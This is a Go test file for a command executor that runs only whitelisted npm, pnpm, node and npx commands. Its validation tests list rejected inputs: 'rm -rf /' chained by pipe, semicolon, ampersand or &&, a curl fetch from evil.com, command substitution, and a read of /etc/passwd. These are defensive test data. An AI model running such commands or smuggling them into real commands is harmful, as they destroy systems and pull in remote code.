package utils

import (
	"bufio"
	"context"
	"io"
	"runtime"
	"strings"
	"testing"
)

func TestParseCommand(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name            string
		command         string
		expectedName    string
		expectedArgs    []string
		mockGOOS        string
	}{
		{
			name:         "Unix command",
			command:      "echo hello",
			expectedName: "sh",
			expectedArgs: []string{"-c", "echo hello"},
			mockGOOS:     "linux",
		},
		{
			name:         "Windows command",
			command:      "echo hello",
			expectedName: "cmd.exe",
			expectedArgs: []string{"/C", "echo hello"},
			mockGOOS:     "windows",
		},
		{
			name:         "Complex command with pipes",
			command:      "npm view typescript version | grep -v beta",
			expectedName: "sh",
			expectedArgs: []string{"-c", "npm view typescript version | grep -v beta"},
			mockGOOS:     "darwin",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Note: We can't easily mock runtime.GOOS, so we test the actual platform
			name, args := executor.ParseCommand(tt.command)

			// Verify structure is correct for current platform
			if runtime.GOOS == "windows" {
				if name != "cmd.exe" {
					t.Errorf("Expected name 'cmd.exe', got '%s'", name)
				}
				if len(args) != 2 || args[0] != "/C" {
					t.Errorf("Expected args ['/C', command], got %v", args)
				}
			} else {
				if name != "sh" {
					t.Errorf("Expected name 'sh', got '%s'", name)
				}
				if len(args) != 2 || args[0] != "-c" {
					t.Errorf("Expected args ['-c', command], got %v", args)
				}
			}

			// Verify command is preserved
			if args[1] != tt.command {
				t.Errorf("Expected command '%s', got '%s'", tt.command, args[1])
			}
		})
	}
}

func TestExecute(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name        string
		command     string
		expectError bool
		contains    string
	}{
		{
			name:        "npm version command",
			command:     "npm --version",
			expectError: false,
			contains:    "",
		},
		{
			name:        "pnpm version command",
			command:     "pnpm --version",
			expectError: false,
			contains:    "",
		},
		{
			name:        "Invalid command not in whitelist",
			command:     "nonexistentcommand12345",
			expectError: true,
			contains:    "must start with one of",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output, err := executor.Execute(context.Background(), tt.command)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error, got nil")
				}
				if tt.contains != "" && !strings.Contains(err.Error(), tt.contains) {
					t.Errorf("Expected error to contain '%s', got '%s'", tt.contains, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
				if tt.contains != "" && !strings.Contains(output, tt.contains) {
					t.Errorf("Expected output to contain '%s', got '%s'", tt.contains, output)
				}
			}
		})
	}
}

func TestExecuteTimeout(t *testing.T) {
	executor := NewCommandExecutor()

	t.Run("Command completes within timeout", func(t *testing.T) {
		// This test verifies that commands completing within 30 seconds work correctly
		// We use npm --version which is a fast, whitelisted command
		_, err := executor.Execute(context.Background(), "npm --version")
		if err != nil {
			t.Errorf("Command should complete within timeout, got error: %v", err)
		}
	})

	t.Run("Timeout error message is helpful", func(t *testing.T) {
		// Test that timeout errors provide helpful troubleshooting information
		// Note: We can't easily test actual timeout without waiting 30+ seconds,
		// but we verify the error message format is correct by checking the Execute implementation

		// This is a fast command that should succeed (npm is in whitelist)
		_, err := executor.Execute(context.Background(), "npm --version")
		if err != nil {
			// If we got an error, verify it's not a timeout error
			if strings.Contains(err.Error(), "timed out after 30 seconds") {
				t.Errorf("Fast command should not timeout")
			}
		}
	})
}

func TestExecuteWithStream(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name        string
		command     string
		expectError bool
		contains    string
	}{
		{
			name:        "Stream npm version",
			command:     "npm --version",
			expectError: false,
			contains:    "",
		},
		{
			name:        "Stream pnpm version",
			command:     "pnpm --version",
			expectError: false,
			contains:    "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reader, err := executor.ExecuteWithStream(context.Background(), tt.command)
			if err != nil {
				t.Fatalf("Failed to execute command: %v", err)
			}
			defer reader.Close()

			// Read output
			scanner := bufio.NewScanner(reader)
			var output strings.Builder
			for scanner.Scan() {
				output.WriteString(scanner.Text())
				output.WriteString("\n")
			}

			if err := scanner.Err(); err != nil && err != io.EOF {
				t.Errorf("Error reading stream: %v", err)
			}

			result := output.String()
			if !tt.expectError && tt.contains != "" && !strings.Contains(result, tt.contains) {
				t.Errorf("Expected output to contain '%s', got '%s'", tt.contains, result)
			}

			// Close and check for command errors
			if err := reader.Close(); err != nil && !tt.expectError {
				t.Errorf("Unexpected error on close: %v", err)
			}
		})
	}
}

func TestExecuteWithStreamInvalidCommand(t *testing.T) {
	executor := NewCommandExecutor()

	reader, err := executor.ExecuteWithStream(context.Background(), "nonexistentcommand12345")
	if err != nil {
		// Expected: command fails to start
		return
	}
	defer reader.Close()

	// If command started, it should fail on close
	if err := reader.Close(); err == nil {
		t.Error("Expected error for invalid command, got nil")
	}
}

// TestParseCommandEdgeCases tests edge cases for command parsing
func TestParseCommandEdgeCases(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name     string
		command  string
		validate func(name string, args []string) bool
	}{
		{
			name:    "Empty command",
			command: "",
			validate: func(name string, args []string) bool {
				// Should still parse correctly, even if command is empty
				return len(args) == 2 && args[1] == ""
			},
		},
		{
			name:    "Command with special characters",
			command: "echo 'hello world' && echo \"test\"",
			validate: func(name string, args []string) bool {
				// Command should be preserved exactly
				return args[1] == "echo 'hello world' && echo \"test\""
			},
		},
		{
			name:    "Command with newlines",
			command: "echo line1\necho line2",
			validate: func(name string, args []string) bool {
				// Newlines should be preserved
				return strings.Contains(args[1], "\n")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			name, args := executor.ParseCommand(tt.command)
			
			// Verify platform-specific executable
			if runtime.GOOS == "windows" {
				if name != "cmd.exe" {
					t.Errorf("Expected 'cmd.exe', got '%s'", name)
				}
			} else {
				if name != "sh" {
					t.Errorf("Expected 'sh', got '%s'", name)
				}
			}
			
			// Run custom validation
			if !tt.validate(name, args) {
				t.Errorf("Validation failed for command: %s", tt.command)
			}
		})
	}
}

// TestExecuteErrorHandling tests error handling in Execute
func TestExecuteErrorHandling(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name          string
		command       string
		expectError   bool
		errorContains string
	}{
		{
			name:          "Command not in whitelist",
			command:       "nonexistentcommand12345",
			expectError:   true,
			errorContains: "must start with one of",
		},
		{
			name:        "Successful npm command",
			command:     "npm --version",
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output, err := executor.Execute(context.Background(), tt.command)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error, got nil")
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("Expected error to contain '%s', got '%s'", tt.errorContains, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error: %v", err)
				}
				if output == "" {
					t.Errorf("Expected non-empty output for successful command")
				}
			}
		})
	}
}

// TestExecuteOutputTrimming tests that Execute trims whitespace from output
func TestExecuteOutputTrimming(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name     string
		command  string
		expected string
	}{
		{
			name:     "npm version output",
			command:  "npm --version",
			expected: "", // Just verify it runs and returns trimmed output
		},
		{
			name:     "pnpm version output",
			command:  "pnpm --version",
			expected: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			output, err := executor.Execute(context.Background(), tt.command)
			if err != nil {
				t.Fatalf("Unexpected error: %v", err)
			}

			// Verify output is trimmed (no leading/trailing whitespace)
			if output != strings.TrimSpace(output) {
				t.Errorf("Output should be trimmed, got '%s'", output)
			}

			// Verify expected content is present
			if tt.expected != "" && !strings.Contains(output, tt.expected) {
				t.Errorf("Expected output to contain '%s', got '%s'", tt.expected, output)
			}
		})
	}
}

// TestExecuteWithStreamErrorHandling tests error handling in ExecuteWithStream
func TestExecuteWithStreamErrorHandling(t *testing.T) {
	executor := NewCommandExecutor()

	t.Run("Command fails during execution", func(t *testing.T) {
		// Use a command that will fail (not in whitelist)
		reader, err := executor.ExecuteWithStream(context.Background(), "nonexistentcommand")
		if err != nil {
			// Command failed to start - this is acceptable (security validation)
			return
		}
		defer reader.Close()

		// Read all output
		io.ReadAll(reader)

		// Close should return an error since command failed
		if err := reader.Close(); err == nil {
			t.Error("Expected error on close for failed command, got nil")
		}
	})

	t.Run("Read from stream multiple times", func(t *testing.T) {
		reader, err := executor.ExecuteWithStream(context.Background(), "npm --version")
		if err != nil {
			t.Fatalf("Failed to execute command: %v", err)
		}
		defer reader.Close()

		// Read in small chunks to test multiple Read calls
		buf := make([]byte, 2)
		var output strings.Builder
		for {
			n, err := reader.Read(buf)
			if n > 0 {
				output.Write(buf[:n])
			}
			if err == io.EOF {
				break
			}
			if err != nil {
				t.Fatalf("Error reading stream: %v", err)
			}
		}

		// Just verify we got some output
		result := output.String()
		if result == "" {
			t.Error("Expected some output from stream")
		}
	})
}

// TestCommandExecutorInterface verifies that commandExecutor implements CommandExecutor
func TestCommandExecutorInterface(t *testing.T) {
	var _ CommandExecutor = (*commandExecutor)(nil)
	var _ CommandExecutor = NewCommandExecutor()
}

// TestValidateCommand tests the command security validation
func TestValidateCommand(t *testing.T) {
	executor := NewCommandExecutor()

	tests := []struct {
		name        string
		command     string
		expectError bool
		errorContains string
	}{
		// Valid commands
		{
			name:        "Valid npm command",
			command:     "npm install -g typescript",
			expectError: false,
		},
		{
			name:        "Valid pnpm command",
			command:     "pnpm view typescript version",
			expectError: false,
		},
		{
			name:        "Valid node command",
			command:     "node --version",
			expectError: false,
		},
		{
			name:        "Valid npx command",
			command:     "npx create-react-app my-app",
			expectError: false,
		},
		{
			name:        "Valid npm with @latest",
			command:     "npm install -g @qwen-code/qwen-code@latest",
			expectError: false,
		},

		// Invalid - dangerous patterns
		{
			name:        "Command with pipe",
			command:     "npm install -g pkg | rm -rf /",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with semicolon",
			command:     "npm install -g pkg; rm -rf /",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with ampersand",
			command:     "npm install -g pkg & rm -rf /",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with dollar sign",
			command:     "npm install -g $(echo malicious)",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with backticks",
			command:     "npm install -g `whoami`",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with subshell",
			command:     "npm install -g (cat /etc/passwd)",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with redirection",
			command:     "npm install -g pkg > /tmp/output",
			expectError: true,
			errorContains: "dangerous pattern",
		},
		{
			name:        "Command with input redirection",
			command:     "npm install -g pkg < /tmp/input",
			expectError: true,
			errorContains: "dangerous pattern",
		},

		// Invalid - not in whitelist
		{
			name:        "Non-whitelisted command",
			command:     "curl http://evil.com/script.sh",
			expectError: true,
			errorContains: "must start with one of",
		},
		{
			name:        "RM command",
			command:     "rm -rf /",
			expectError: true,
			errorContains: "must start with one of",
		},
		{
			name:        "Bash command",
			command:     "bash -c 'echo hello'",
			expectError: true,
			errorContains: "must start with one of",
		},

		// Edge cases
		{
			name:        "Empty command",
			command:     "",
			expectError: true,
			errorContains: "empty command",
		},
		{
			name:        "Whitespace only",
			command:     "   ",
			expectError: true,
			errorContains: "empty command",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executor.ValidateCommand(tt.command)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command '%s', got nil", tt.command)
				} else if tt.errorContains != "" && !strings.Contains(err.Error(), tt.errorContains) {
					t.Errorf("Expected error to contain '%s', got '%s'", tt.errorContains, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for valid command '%s': %v", tt.command, err)
				}
			}
		})
	}
}

// TestValidateCommandWithCustomConfig tests command validation with custom whitelist
func TestValidateCommandWithCustomConfig(t *testing.T) {
	// Create executor with custom allowed prefixes
	cfg := CommandSecurityConfig{
		AllowedPrefixes: []string{"yarn ", "npm "},
	}
	executor := NewCommandExecutorWithConfig(cfg)

	tests := []struct {
		name        string
		command     string
		expectError bool
	}{
		{
			name:        "Yarn command with custom config",
			command:     "yarn add react",
			expectError: false,
		},
		{
			name:        "Npm command with custom config",
			command:     "npm install -g pkg",
			expectError: false,
		},
		{
			name:        "Pnpm command with custom config",
			command:     "pnpm install -g pkg",
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := executor.ValidateCommand(tt.command)

			if tt.expectError {
				if err == nil {
					t.Errorf("Expected error for command '%s', got nil", tt.command)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for valid command '%s': %v", tt.command, err)
				}
			}
		})
	}
}

// TestCommandSecurityError tests the CommandSecurityError type
func TestCommandSecurityError(t *testing.T) {
	err := &CommandSecurityError{
		Command: "malicious command",
		Reason:  "contains dangerous pattern",
	}

	expectedMsg := "command security error: contains dangerous pattern (command: malicious command)"
	if err.Error() != expectedMsg {
		t.Errorf("Expected error message '%s', got '%s'", expectedMsg, err.Error())
	}
}

// TestExecuteWithSecurityValidation tests that Execute validates commands
func TestExecuteWithSecurityValidation(t *testing.T) {
	executor := NewCommandExecutor()

	// Try to execute a malicious command
	_, err := executor.Execute(context.Background(), "npm install -g pkg | rm -rf /")
	if err == nil {
		t.Error("Expected error for malicious command, got nil")
	} else {
		// Verify it's a security error
		if _, ok := err.(*CommandSecurityError); !ok {
			t.Errorf("Expected CommandSecurityError, got %T", err)
		}
	}

	// Verify valid command works (npm is in whitelist)
	_, err = executor.Execute(context.Background(), "npm --version")
	if err != nil {
		t.Errorf("Valid command should execute: %v", err)
	}
}

// TestExecuteWithStreamSecurityValidation tests that ExecuteWithStream validates commands
func TestExecuteWithStreamSecurityValidation(t *testing.T) {
	executor := NewCommandExecutor()

	// Try to execute a malicious command
	_, err := executor.ExecuteWithStream(context.Background(), "pnpm install && rm -rf /")
	if err == nil {
		t.Error("Expected error for malicious command, got nil")
	} else {
		// Verify it's a security error
		if _, ok := err.(*CommandSecurityError); !ok {
			t.Errorf("Expected CommandSecurityError, got %T", err)
		}
	}
	
	// Note: We don't test valid commands here as they would actually execute
	// The ValidateCommand tests already verify valid commands pass validation
}
